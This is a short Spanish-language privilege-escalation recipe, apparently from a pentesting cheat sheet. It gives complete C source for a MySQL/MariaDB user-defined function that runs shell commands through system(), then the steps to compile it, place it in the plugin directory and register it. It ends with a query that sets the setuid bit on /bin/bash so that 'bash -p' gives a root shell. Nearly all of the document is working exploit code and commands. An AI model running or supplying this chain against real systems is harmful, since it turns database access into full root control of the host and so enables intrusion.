Se realiza cuando se tiene acceso a una base de datos corriendo con privilegios root.

```bash
cd /tmp
nano lib_mysqludf_sys.c

#Dentro del nano
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mysql/mysql.h>

my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
        strcpy(message, "sys_exec() takes exactly one string argument.");
        return 1;
    }
    return 0;
}

long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
    if (args->args[0]) {
        return system(args->args[0]);
    }
    return -1;
}

my_bool sys_exec_deinit(UDF_INIT *initid) {
    return 0;
}
```

Compilar :

```bash
gcc -shared -o lib_mysqludf_sys.so -fPIC lib_mysqludf_sys.c -I/usr/include/mysql/ -L/usr/lib/ -lmariadbclient
mv /tmp/lib_mysqludf_sys.so /usr/lib/mysql/plugin/
```

Entrar : 

mysql -u USER -pPASSWD

```bash
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
```

info : 

```
MariaDB [mysql]> CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';Query OK, 0 rows affected (0.001 sec)
```

```bash
SELECT sys_exec('chmod u+s /bin/bash');
```

Si funcionó sale un `0`un `1` seria un error.

bash -p
